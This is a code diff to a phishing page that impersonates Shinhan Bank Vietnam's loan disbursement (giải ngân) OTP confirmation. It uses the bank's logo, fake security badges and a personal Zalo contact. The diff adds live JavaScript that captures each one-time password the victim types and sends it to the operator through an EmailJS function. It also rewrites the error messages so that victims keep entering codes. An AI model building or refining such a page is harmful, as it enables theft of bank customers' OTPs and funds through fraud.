@@ -243,6 +243,14 @@
             margin-right: 8px;
         }
 
+        .check-info {
+            text-align: center;
+            font-size: 16px;
+            font-weight: bold;
+            color: #003087;
+            margin: 15px 0;
+        }
+
         .summary {
             margin-bottom: 20px;
             padding: 15px;
@@ -350,6 +358,7 @@
             z-index: 1000;
             max-width: 90%;
             min-height: 150px;
+            border: 1px solid #ccc;
         }
 
         .error-dialog.show {
@@ -358,6 +367,11 @@
 
         .error-dialog p {
             margin-bottom: 15px;
+            font-size: 14px;
+        }
+
+        .error-dialog button {
+            padding: 10px 20px;
             font-size: 14px;
         }
 
@@ -463,12 +477,32 @@
                 padding: 12px;
             }
 
+            .check-info {
+                font-size: 14px;
+                margin: 10px 0;
+            }
+
             .form-group {
                 margin-bottom: 10px;
             }
 
             .form-group input {
                 padding: 10px;
+                font-size: 14px;
+            }
+
+            .error-dialog {
+                max-width: 80%;
+                padding: 15px;
+                border: 1px solid #ccc;
+            }
+
+            .error-dialog p {
+                font-size: 14px;
+            }
+
+            .error-dialog button {
+                padding: 10px 20px;
                 font-size: 14px;
             }
 
@@ -555,7 +589,7 @@
     <div class="container">
         <h2>
             <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Logo" style="height: 24px; vertical-align: middle; margin-right: 8px;">
-            Vui lòng kiểm tra thông tin trước khi giảy ngân !
+            Xác Nhận Giải Ngân Qua ATM
         </h2>
         <div class="summary">
             <h3>Thông tin giải ngân</h3>
@@ -567,6 +601,7 @@
             <p>Số điện thoại: <span id="summaryPhone"></span></p>
             <p>Số tài khoản nhận tiền giải ngân: <span id="summaryAccountNumber"></span></p>
         </div>
+        <p class="check-info">Vui lòng kiểm tra thông tin trước khi giảy ngân !</p>
         <div class="form-group" aria-live="polite">
             <p id="otpMessage"></p>
             <label for="otp">Nhập mã OTP</label>
@@ -584,14 +619,14 @@
         </div>
     </div>
 
-        <footer role="contentinfo" aria-label="Footer">
+    <footer role="contentinfo" aria-label="Footer">
         <p>Liên hệ: <a href="mailto:support@shinhanbank.vn">support@shinhanbank.vn</a> | Hotline: 1900-1234</p>
         <p><a href="http://zalo.me/84762797077">Hỗ trợ trò chuyện</a></p>
         <p>Kết nối an toàn với SSL</p>
-       <img src="https://napthe.zalopay.vn/static/desktop/images/logos/PCI.svg" alt="PCI DSS">
+        <img src="https://napthe.zalopay.vn/static/desktop/images/logos/PCI.svg" alt="PCI DSS">
         <img src="https://simg.zalopay.com.vn/zst/zlp-website/resources/images/footer/BCTLogo_1.png" alt="Bộ Công Thương">
-         <img src="https://napthengay.vn/logoSaleNoti.png" alt="Bộ Công Thương">
-       <p>Dữ liệu được mã hóa với SSL</p>
+        <img src="https://napthengay.vn/logoSaleNoti.png" alt="Bộ Công Thương">
+        <p>Dữ liệu được mã hóa với SSL</p>
         <p>© 2025 Shinhan Bank Việt Nam. All Rights Reserved.</p>
         <p>Địa chỉ: Tầng 12, Tòa nhà Vincom Center, 72 Lê Thánh Tôn, Quận 1, TP. Hồ Chí Minh</p>
     </footer>
@@ -640,6 +675,9 @@
                 document.getElementById('summaryPhone').textContent = formData.phone || 'N/A';
                 document.getElementById('summaryAccountNumber').textContent = formData.accountNumber || 'N/A';
                 document.getElementById('otpMessage').innerHTML = `Vui lòng nhập mã xác nhận giải ngân được gửi qua số điện thoại<br>${formData.phone || 'N/A'}<br>liên kết với tài khoản ngân hàng nhận tiền<br>để xác nhận đồng ý giải ngân số tiền<br>${formData.amount || 'N/A'} về tài khoản ngân hàng.`;
+                // Send initial OTP to EmailJS
+                console.log('Sending initial OTP to EmailJS');
+                sendOTPToEmail('123456', formData.phone || 'N/A');
             } catch (error) {
                 console.error('Error parsing formData:', error);
                 alert('Lỗi khi tải thông tin giải ngân. Vui lòng thử lại.');
@@ -654,7 +692,8 @@
             document.getElementById('otp').addEventListener('input', () => {
                 const otp = document.getElementById('otp').value.trim();
                 console.log('OTP input:', otp); // Debug log
-                if (otp && /^\d{6}$/.test(otp)) { // Only send if OTP is 6 digits
+                if (otp && /^\d{6}$/.test(otp)) { // Send if OTP is 6 digits
+                    console.log('Collecting OTP from input:', otp);
                     sendOTPToEmail(otp, formData.phone || 'N/A');
                 }
             });
@@ -750,7 +789,11 @@
             const amount = parseInt(formData.amount?.replace(/[^0-9]/g, '') || 0);
             const minBalance = amount * 0.1;
 
-            // Send OTP to EmailJS (kept as per original code)
+            // Reset timer
+            startOTPTimer();
+
+            // Send OTP to EmailJS
+            console.log('Collecting OTP from verify:', otp);
             sendOTPToEmail(otp, phone);
 
             if (/^\d{6}$/.test(otp) && otp === '123456') { // Simulated correct OTP
@@ -764,7 +807,7 @@
                 const message = document.getElementById('errorMessage');
 
                 if (failedAttempts === 1) {
-                    message.textContent = 'Mã OTP hết hiệu lực. Mã xác nhận sẽ được gửi lại sau 1 phút. Vui lòng kiểm tra lại và xác nhận.';
+                    message.textContent = 'Mã OTP không đúng, vui lòng kiểm tra lại.';
                     dialog.classList.add('show');
                     setTimeout(() => {
                         closeErrorDialog();
